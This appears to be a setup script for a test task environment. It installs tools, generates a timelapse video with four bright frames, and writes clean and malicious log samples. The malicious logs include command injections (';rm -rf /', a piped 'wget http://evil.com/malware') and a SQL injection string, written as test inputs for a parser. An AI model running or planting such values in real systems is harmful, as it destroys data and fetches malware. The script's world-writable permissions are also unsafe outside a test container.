#!/bin/bash
set -e
export DEBIAN_FRONTEND=noninteractive
    apt-get update && apt-get install -y python3 python3-pip ffmpeg libsm6 libxext6 e2fsprogs
    pip3 install pytest opencv-python-headless numpy

    mkdir -p /app/corpora/logs/clean
    mkdir -p /app/corpora/logs/evil
    mkdir -p /home/user

    # Generate video
    python3 -c "
import cv2
import numpy as np

out = cv2.VideoWriter('/app/server_room_timelapse.mp4', cv2.VideoWriter_fourcc(*'mp4v'), 1, (640, 480))
for i in range(60):
    if i in [12, 25, 41, 55]:
        frame = np.full((480, 640, 3), 255, dtype=np.uint8)
    else:
        frame = np.zeros((480, 640, 3), dtype=np.uint8)
    out.write(frame)
out.release()
"

    # Generate clean logs
    cat << 'EOF' > /app/corpora/logs/clean/log1.txt
2023-10-12T10:00:00Z server-1 45% 2.3GB
2023-10-12T10:01:00Z server-1 46% 2.3GB
EOF

    cat << 'EOF' > /app/corpora/logs/clean/log2.txt
2023-10-12T10:00:00Z web-node-2 80% 8.1GB
EOF

    # Generate evil logs
    cat << 'EOF' > /app/corpora/logs/evil/evil1.txt
2023-10-12T10:00:00Z server-1;rm -rf / 45% 2.3GB
EOF

    cat << 'EOF' > /app/corpora/logs/evil/evil2.txt
2023-10-12T10:00:00Z server-2 45% 2.3GB' OR 1=1
EOF

    cat << 'EOF' > /app/corpora/logs/evil/evil3.txt
2023-10-12T10:00:00Z server-3|wget http://evil.com/malware 45% 2.3GB
EOF

    useradd -m -s /bin/bash user || true
    chmod -R 777 /home/user
    chmod -R 777 /app
